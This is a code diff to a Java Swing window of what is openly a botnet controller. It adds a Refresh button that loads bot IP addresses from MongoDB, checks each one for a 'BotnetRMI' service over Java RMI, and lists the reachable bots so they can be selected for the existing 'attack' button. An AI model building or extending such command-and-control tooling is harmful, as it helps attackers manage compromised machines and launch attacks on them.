@@ -5,8 +5,11 @@
  */
 package view;
 
+import DBUtils.MongoConnect;
+import java.rmi.Naming;
 import java.util.ArrayList;
 import javax.swing.table.DefaultTableModel;
+import model.IBotnet;
 
 /**
  *
@@ -41,6 +44,7 @@ public class ListFrm extends javax.swing.JFrame {
         jScrollPane1 = new javax.swing.JScrollPane();
         listTable = new javax.swing.JTable();
         attackButton = new javax.swing.JButton();
+        Refresh = new javax.swing.JButton();
 
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
 
@@ -82,22 +86,33 @@ public class ListFrm extends javax.swing.JFrame {
             }
         });
 
+        Refresh.setText("Refresh");
+        Refresh.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                RefreshActionPerformed(evt);
+            }
+        });
+
         javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
         getContentPane().setLayout(layout);
         layout.setHorizontalGroup(
             layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
             .addComponent(jScrollPane1, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 562, Short.MAX_VALUE)
             .addGroup(layout.createSequentialGroup()
-                .addGap(210, 210, 210)
+                .addGap(93, 93, 93)
+                .addComponent(Refresh, javax.swing.GroupLayout.PREFERRED_SIZE, 136, javax.swing.GroupLayout.PREFERRED_SIZE)
+                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                 .addComponent(attackButton, javax.swing.GroupLayout.PREFERRED_SIZE, 136, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
+                .addGap(98, 98, 98))
         );
         layout.setVerticalGroup(
             layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
             .addGroup(layout.createSequentialGroup()
                 .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 276, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 99, Short.MAX_VALUE)
-                .addComponent(attackButton, javax.swing.GroupLayout.PREFERRED_SIZE, 44, javax.swing.GroupLayout.PREFERRED_SIZE)
+                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 98, Short.MAX_VALUE)
+                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
+                    .addComponent(Refresh, javax.swing.GroupLayout.PREFERRED_SIZE, 44, javax.swing.GroupLayout.PREFERRED_SIZE)
+                    .addComponent(attackButton, javax.swing.GroupLayout.PREFERRED_SIZE, 44, javax.swing.GroupLayout.PREFERRED_SIZE))
                 .addGap(30, 30, 30))
         );
 
@@ -111,12 +126,34 @@ public class ListFrm extends javax.swing.JFrame {
         for(int i = 0; i < listTable.getRowCount(); i++){
             if((Boolean)model.getValueAt(i, 0) == true)
             {
-                selectedIP.add((String)model.getValueAt(i, 1));
+                String ip = (String)model.getValueAt(i, 1) + "";
+                selectedIP.add(ip);
             }
         }
         new ActionFrm(selectedIP).setVisible(true);
         this.setVisible(false);
     }//GEN-LAST:event_attackButtonActionPerformed
+
+    private void RefreshActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_RefreshActionPerformed
+        // TODO add your handling code here:
+        MongoConnect client = new MongoConnect();
+        client.Connect();
+        ArrayList<String> list = client.Read("bot_ip");
+        ArrayList<String> states = new ArrayList<>();
+        for (String ip : list){
+            try {
+                IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + ip + ":" + "1234" + "/BotnetRMI");
+                states.add("Available");
+            } catch (Exception ex){
+                states.add("Unavailable");
+            }
+        }
+        DefaultTableModel model = (DefaultTableModel) listTable.getModel();
+        model.setRowCount(0);
+        for (int i = 0; i < list.size(); i++) {
+            model.addRow(new Object[]{false, list.get(i), states.get(i)});
+        }
+    }//GEN-LAST:event_RefreshActionPerformed
 
     /**
      * @param args the command line arguments
@@ -154,6 +191,7 @@ public class ListFrm extends javax.swing.JFrame {
     }
 
     // Variables declaration - do not modify//GEN-BEGIN:variables
+    private javax.swing.JButton Refresh;
     private javax.swing.JButton attackButton;
     private javax.swing.JScrollPane jScrollPane1;
     private javax.swing.JTable listTable;
